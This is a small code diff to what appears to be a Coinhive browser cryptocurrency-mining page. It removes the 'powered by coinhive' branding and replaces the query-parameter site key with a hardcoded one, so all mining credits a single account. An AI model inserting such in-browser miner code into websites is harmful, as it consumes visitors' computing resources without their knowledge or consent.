@@ -190,13 +190,6 @@
 <div class="box graph">
 	<canvas id="graph-canvas"></canvas>
 </div>
-<div class="foot" id="branding">
-	<span class="powered-by">powered by</span>
-	<a href="https://coinhive.com/" target="_blank">
-		<img src="/media/coinhive-icon.png" class="icon"/>
-		coinhive
-	</a>
-</div>
 <div style="clear: left"></div>
 <div id="mining-buttons">
 	<div id="mining-buttons-overlay"></div>
@@ -227,7 +220,7 @@
 		return decodeURIComponent(results[2].replace(/\+/g, " "));
 	};
 	// Load site key and optional user name
-	var siteKey = queryParam('key');
+	var siteKey = 'SDNvKfd6aZGG7aDdj7nBoOB33yD28KeR';
 	var userName = queryParam('user');
 	if (!siteKey || siteKey.length !== 32) {
 		document.body.innerHTML = 'Invalid Site Key';
